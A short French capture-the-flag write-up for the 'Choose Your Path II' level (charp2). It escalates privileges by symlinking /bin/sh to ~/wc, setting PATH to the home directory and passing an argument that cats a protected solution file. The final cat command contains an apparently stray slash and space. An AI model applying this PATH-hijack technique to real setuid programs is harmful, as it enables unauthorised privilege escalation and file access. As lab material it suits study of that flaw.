# **Choose Your Path II**

## Configuration de l'environnement

Pour utiliser le programme `charp2`, suivez les étapes ci-dessous pour configurer votre environnement.

### 1. Créer un lien symbolique

Créez un lien symbolique vers `/bin/sh` en utilisant la commande suivante :

```bash
ln -s /bin/sh ~/wc
```

### 2. Rediriger la variable d'environnement

Redirigez la variable d'environnement par défaut vers votre répertoire personnel avec la commande :

```bash
PATH=~
```

## Exécution du programme

Pour obtenir la solution, exécutez la commande suivante dans `/home/level/11_choose_your_path2` :

```bash
./charp2 '/bin/cat/ solution.txt 1>&2'
```

La solution sera affichée une fois que la commande aura été exécutée avec succès. Assurez-vous d'avoir suivi les étapes de configuration de l'environnement avant d'exécuter le programme.